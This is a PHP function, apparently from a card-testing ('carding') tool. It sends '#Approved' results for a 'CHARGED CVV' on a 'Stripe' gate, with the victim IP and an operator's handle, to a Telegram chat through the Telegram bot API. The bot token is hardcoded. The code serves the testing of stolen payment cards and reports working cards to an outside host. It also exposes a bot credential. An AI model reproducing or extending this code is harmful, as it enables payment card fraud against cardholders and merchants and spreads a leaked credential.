<?php

function forwardLives($gate  = "Stripe", $liveType = "CHARGED CVV")
{
    global $token, $userId, $ip;
    $botToken = "8099845785:AAGNQGM7jgv38FpwFdJNbCY389NlBX1ZOZg";
    $msg = "#Approved <code> $ip </code> 「 $liveType 」 「 $gate CHARGE: @luffy_dxD 」";
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$userId&text=" . urlencode($msg) . "&parse_mode=HTML");
}
